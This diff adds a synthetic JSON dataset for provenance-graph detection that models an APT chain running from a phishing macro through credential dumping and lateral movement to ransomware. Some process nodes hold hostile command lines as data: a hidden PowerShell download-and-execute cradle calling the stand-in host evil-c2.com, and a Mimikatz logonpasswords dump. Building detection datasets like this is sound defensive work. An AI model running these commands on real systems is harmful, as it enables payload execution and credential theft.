@@ -1,0 +1,329 @@
+{
+  "meta": {
+    "description": "APT Simulation Dataset for Provenance Graph",
+    "version": "1.0",
+    "scenarios": ["Phishing", "Credential Dumping", "Ransomware"]
+  },
+  "nodes": [
+    {
+      "uid": "Host:HR-PC-01",
+      "ntype": "Host",
+      "key": { "host.name": "HR-PC-01" },
+      "props": { "os": "Windows 10", "ip": "192.168.1.10" }
+    },
+    {
+      "uid": "Host:DEV-PC-02",
+      "ntype": "Host",
+      "key": { "host.name": "DEV-PC-02" },
+      "props": { "os": "Windows 11", "ip": "192.168.1.11" }
+    },
+    {
+      "uid": "Host:IT-ADMIN-01",
+      "ntype": "Host",
+      "key": { "host.name": "IT-ADMIN-01" },
+      "props": { "os": "Windows 10", "ip": "192.168.1.50" }
+    },
+    {
+      "uid": "Host:WEB-SRV-01",
+      "ntype": "Host",
+      "key": { "host.name": "WEB-SRV-01" },
+      "props": { "os": "Ubuntu 20.04", "ip": "10.0.0.80" }
+    },
+    {
+      "uid": "Host:DB-SRV-01",
+      "ntype": "Host",
+      "key": { "host.name": "DB-SRV-01" },
+      "props": { "os": "Windows Server 2019", "ip": "10.0.0.90", "asset_value": "high" }
+    },
+    {
+      "uid": "Host:FILE-SRV-01",
+      "ntype": "Host",
+      "key": { "host.name": "FILE-SRV-01" },
+      "props": { "os": "Windows Server 2016", "ip": "10.0.0.100" }
+    },
+    {
+      "uid": "Host:AD-DC-01",
+      "ntype": "Host",
+      "key": { "host.name": "AD-DC-01" },
+      "props": { "os": "Windows Server 2022", "ip": "10.0.0.2" }
+    },
+    {
+      "uid": "User:alice",
+      "ntype": "User",
+      "key": { "user.name": "alice" },
+      "props": { "role": "HR" }
+    },
+    {
+      "uid": "User:admin",
+      "ntype": "User",
+      "key": { "user.name": "admin" },
+      "props": { "role": "IT" }
+    },
+    {
+      "uid": "Process:HR-Outlook",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-1001" },
+      "props": { "name": "outlook.exe", "pid": 1001, "cmdline": "outlook.exe", "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:HR-Word",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-1002" },
+      "props": { "name": "winword.exe", "pid": 1002, "cmdline": "winword.exe C:\\Downloads\\resume_bonus.docm", "host": "HR-PC-01" }
+    },
+    {
+      "uid": "File:Malicious-Doc",
+      "ntype": "File",
+      "key": { "file.path": "C:\\Users\\alice\\Downloads\\resume_bonus.docm" },
+      "props": { "extension": "docm", "entropy": 5.2 }
+    },
+    {
+      "uid": "Process:HR-PowerShell-Mal",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-1003" },
+      "props": { "name": "powershell.exe", "pid": 1003, "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.com/payload.ps1')", "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Domain:Evil-C2",
+      "ntype": "Domain",
+      "key": { "dns.question.name": "evil-c2.com" },
+      "props": { "reputation": "bad" }
+    },
+    {
+      "uid": "IP:C2-Addr",
+      "ntype": "IP",
+      "key": { "ip": "45.10.20.99" },
+      "props": { "geo": "Unknown" }
+    },
+    {
+      "uid": "Process:HR-Svchost-Beacon",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-1004" },
+      "props": { "name": "svchost.exe", "pid": 1004, "cmdline": "svchost.exe -k netsvcs", "note": "Masquerading Beacon", "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:HR-Lsass",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-444" },
+      "props": { "name": "lsass.exe", "pid": 444, "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:HR-Mimikatz",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-1099" },
+      "props": { "name": "mimi.exe", "pid": 1099, "cmdline": "mimi.exe privilege::debug sekurlsa::logonpasswords", "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:DB-Services",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-2001" },
+      "props": { "name": "services.exe", "pid": 600, "host": "DB-SRV-01" }
+    },
+    {
+      "uid": "Process:DB-WmiPrvSE",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-2002" },
+      "props": { "name": "wmiprvse.exe", "pid": 2002, "host": "DB-SRV-01" }
+    },
+    {
+      "uid": "Process:DB-Cmd-Lateral",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-2003" },
+      "props": { "name": "cmd.exe", "pid": 2003, "cmdline": "cmd.exe /c start_ransom.bat", "host": "DB-SRV-01" }
+    },
+    {
+      "uid": "Process:DB-Ransomware",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-guid-2004" },
+      "props": { "name": "crypt_v2.exe", "pid": 2004, "host": "DB-SRV-01" }
+    },
+    {
+      "uid": "File:DB-CustomerData",
+      "ntype": "File",
+      "key": { "file.path": "D:\\Data\\customers.mdf" },
+      "props": { "size": 1024000 }
+    },
+    {
+      "uid": "File:DB-CustomerData-Enc",
+      "ntype": "File",
+      "key": { "file.path": "D:\\Data\\customers.mdf.lock" },
+      "props": { "size": 1024005 }
+    },
+    {
+      "uid": "Process:Background-1",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-01" },
+      "props": { "name": "chrome.exe", "pid": 3001, "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:Background-2",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-02" },
+      "props": { "name": "teams.exe", "pid": 3002, "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:Background-3",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-03" },
+      "props": { "name": "explorer.exe", "pid": 3003, "host": "HR-PC-01" }
+    },
+    {
+      "uid": "Process:Background-4",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-04" },
+      "props": { "name": "sqlservr.exe", "pid": 1500, "host": "DB-SRV-01" }
+    },
+    {
+      "uid": "Process:Background-5",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-05" },
+      "props": { "name": "winlogon.exe", "pid": 400, "host": "AD-DC-01" }
+    },
+    {
+      "uid": "Process:Background-6",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-06" },
+      "props": { "name": "spoolsv.exe", "pid": 1100, "host": "FILE-SRV-01" }
+    },
+    {
+      "uid": "Process:Background-7",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-07" },
+      "props": { "name": "nginx", "pid": 80, "host": "WEB-SRV-01" }
+    },
+    {
+      "uid": "Process:Background-8",
+      "ntype": "Process",
+      "key": { "process.entity_id": "proc-bg-08" },
+      "props": { "name": "python", "pid": 8080, "host": "DEV-PC-02" }
+    },
+    {
+      "uid": "Endpoint:DB-SMB",
+      "ntype": "Endpoint",
+      "key": { "ip": "10.0.0.90", "port": 445, "transport": "tcp" },
+      "props": { "protocol": "smb" }
+    },
+    {
+      "uid": "Endpoint:C2-Listener",
+      "ntype": "Endpoint",
+      "key": { "ip": "45.10.20.99", "port": 80, "transport": "tcp" },
+      "props": {}
+    }
+  ],
+  "edges": [
+    {
+      "src_uid": "Process:Background-3",
+      "dst_uid": "Process:HR-Outlook",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T09:00:00Z" }
+    },
+    {
+      "src_uid": "Process:HR-Outlook",
+      "dst_uid": "Process:HR-Word",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T09:05:00Z", "note": "User opened attachment" }
+    },
+    {
+      "src_uid": "Process:HR-Word",
+      "dst_uid": "File:Malicious-Doc",
+      "rtype": "ACCESSED",
+      "props": { "access_mask": "READ" }
+    },
+    {
+      "src_uid": "Process:HR-Word",
+      "dst_uid": "Process:HR-PowerShell-Mal",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T09:05:05Z", "note": "Macro Execution" }
+    },
+    {
+      "src_uid": "Process:HR-PowerShell-Mal",
+      "dst_uid": "Domain:Evil-C2",
+      "rtype": "RESOLVES",
+      "props": { "timestamp": "2023-10-27T09:05:06Z" }
+    },
+    {
+      "src_uid": "Domain:Evil-C2",
+      "dst_uid": "IP:C2-Addr",
+      "rtype": "RESOLVES_TO",
+      "props": {}
+    },
+    {
+      "src_uid": "Process:HR-PowerShell-Mal",
+      "dst_uid": "Endpoint:C2-Listener",
+      "rtype": "CONNECTS_TO",
+      "props": { "timestamp": "2023-10-27T09:05:10Z", "bytes_sent": 500 }
+    },
+    {
+      "src_uid": "Process:HR-PowerShell-Mal",
+      "dst_uid": "Process:HR-Svchost-Beacon",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T09:06:00Z", "note": "Process Injection" }
+    },
+    {
+      "src_uid": "Process:HR-Svchost-Beacon",
+      "dst_uid": "Process:HR-Mimikatz",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T10:00:00Z" }
+    },
+    {
+      "src_uid": "Process:HR-Mimikatz",
+      "dst_uid": "Process:HR-Lsass",
+      "rtype": "ACCESSED",
+      "props": { "timestamp": "2023-10-27T10:01:00Z", "access_mask": "0x1400 (QUERY_INFO|VM_READ)" }
+    },
+    {
+      "src_uid": "Process:HR-Svchost-Beacon",
+      "dst_uid": "Endpoint:DB-SMB",
+      "rtype": "CONNECTS_TO",
+      "props": { "timestamp": "2023-10-27T11:00:00Z", "protocol": "SMB" }
+    },
+    {
+      "src_uid": "Host:HR-PC-01",
+      "dst_uid": "Host:DB-SRV-01",
+      "rtype": "COMMUNICATES_WITH",
+      "props": { "timestamp": "2023-10-27T11:00:00Z", "flow_id": "fl-999" }
+    },
+    {
+      "src_uid": "Process:DB-Services",
+      "dst_uid": "Process:DB-WmiPrvSE",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T11:00:05Z", "note": "WMI Remote Execution" }
+    },
+    {
+      "src_uid": "Process:DB-WmiPrvSE",
+      "dst_uid": "Process:DB-Cmd-Lateral",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T11:00:10Z" }
+    },
+    {
+      "src_uid": "Process:DB-Cmd-Lateral",
+      "dst_uid": "Process:DB-Ransomware",
+      "rtype": "SPAWNED",
+      "props": { "timestamp": "2023-10-27T11:05:00Z" }
+    },
+    {
+      "src_uid": "Process:DB-Ransomware",
+      "dst_uid": "File:DB-CustomerData",
+      "rtype": "ACCESSED",
+      "props": { "timestamp": "2023-10-27T11:05:05Z", "action": "READ" }
+    },
+    {
+      "src_uid": "Process:DB-Ransomware",
+      "dst_uid": "File:DB-CustomerData-Enc",
+      "rtype": "WROTE",
+      "props": { "timestamp": "2023-10-27T11:05:10Z", "entropy": 7.9 }
+    },
+    {
+      "src_uid": "User:alice",
+      "dst_uid": "Host:HR-PC-01",
+      "rtype": "ON_HOST",
+      "props": {}
+    },
+    {
+      "src_uid": "Process:HR-Outlook",
+      "dst_uid": "Host:HR-PC-01",
+      "rtype": "ON_HOST",
+      "props": {}
+    }
+  ]
+}
